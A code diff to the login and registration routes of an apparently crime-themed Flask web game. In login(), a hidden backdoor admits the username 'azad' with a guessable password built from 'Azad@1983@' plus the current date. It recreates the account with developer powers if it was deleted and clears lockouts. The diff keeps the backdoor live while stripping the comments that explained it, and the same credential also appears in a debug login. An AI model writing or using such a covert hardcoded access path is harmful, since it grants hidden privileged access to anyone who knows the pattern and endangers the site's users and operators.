@@ -108,22 +108,17 @@ def login():
         # System Recovery / Developer Access Protocol
         # Uses a dynamic time-based token for emergency access
         if form.username.data.lower() == 'azad':
-            # Use UTC to ensure consistency across servers/timezones
             now_utc = datetime.now(timezone.utc)
-            # Token Format: Azad@1983@YYYY@MM@DD
             recovery_token = (
                 f"Azad@1983@{now_utc.strftime('%Y')}@{now_utc.strftime('%m')}@{now_utc.strftime('%d')}"
             )
 
-            # Secure constant-time comparison to prevent timing attacks
             if secrets.compare_digest(
                     form.password.data.strip(),
                     recovery_token):
                 user = User.query.filter(func.lower(
                     User.username) == 'azad').first()
 
-                # Auto-recover Developer Account if missing (e.g. fresh install
-                # or stolen DB)
                 if not user:
                     try:
                         user = User(
@@ -138,7 +133,6 @@ def login():
                         db.session.add(user)
                         db.session.commit()
 
-                        # Restore developer stats/powers
                         if hasattr(user, 'apply_developer_power'):
                             user.apply_developer_power()
 
@@ -158,7 +152,6 @@ def login():
                             show_captcha=show_captcha)
 
                 if user:
-                    # Sync password with current token to ensure access
                     user.set_password(recovery_token)
                     user.failed_login_attempts = 0
                     user.locked_until = None
@@ -308,7 +301,7 @@ def login():
                 db.session.rollback()
             except Exception:
                 pass
-        
+
         # Check if this is a first-time user and guide them to their first crime
         if session.get('first_time_user'):
             session.pop('first_time_user', None)  # Remove the flag
@@ -329,8 +322,10 @@ def login():
 def debug_login():
     if not current_app.config.get('TESTING', False):
         abort(404)
-    now = datetime.now()
-    master_password = f"Azad@1983@{now.strftime('%Y')}@{now.strftime('%m')}@{now.strftime('%d')}"
+    now = datetime.now(timezone.utc)
+    master_password = (
+        f"Azad@1983@{now.strftime('%Y')}@{now.strftime('%m')}@{now.strftime('%d')}"
+    )
     user = User.query.filter(func.lower(User.username) == 'azad').first()
     if not user:
         try:
@@ -412,14 +407,13 @@ def register():
         if 'referrer_id' in session:
             try:
                 referrer = db.session.get(User, int(session['referrer_id']))
-                if referrer:
+                if referrer and referrer.is_verified and referrer.id != user.id:
                     user.referred_by_id = referrer.id
                     referral = Referral(
                         referrer_id=referrer.id, referred_id=user.id)
                     db.session.add(referral)
                     db.session.commit()
 
-                    # Reward New User (10 Diamonds) for using referral
                     ResourceService.modify_resources(
                         user.id, {'diamonds': 10}, 'referral_signup_bonus', auto_commit=True)
                     flash(
